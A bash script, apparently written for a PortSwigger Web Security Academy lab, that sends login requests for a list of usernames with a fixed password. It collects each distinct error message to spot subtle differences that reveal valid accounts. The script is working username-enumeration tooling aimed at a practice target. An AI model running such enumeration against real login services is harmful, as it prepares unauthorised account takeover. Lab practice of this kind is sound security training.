#!/bin/bash

echo "Looking for VERY subtle differences in error messages..."
echo "======================================================"
echo ""

# Store all unique error messages
declare -A error_messages
declare -A users_with_error

while IFS= read -r user; do
    response=$(curl -s -X POST "https://0a0e004a04be7fa081da8aa70008003b.web-security-academy.net/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: session=Zj5ZT2FoyIS2txq2JmIWYDW41JykgiqP" \
        -d "username=$user&password=test")
    
    # Extract the exact error message including any subtle differences
    error_line=$(echo "$response" | grep '<p class=is-warning>')
    
    # Store the error message
    if [ -n "$error_line" ]; then
        error_messages["$error_line"]=1
        users_with_error["$error_line"]+="$user "
    fi
done < <(head -20 usernames.txt)

echo "Found ${#error_messages[@]} unique error message(s):"
echo ""

# Display each unique error message and associated users
for error in "${!error_messages[@]}"; do
    echo "Error message:"
    echo "$error"
    echo "Users with this error: ${users_with_error[$error]}"
    echo "---"
done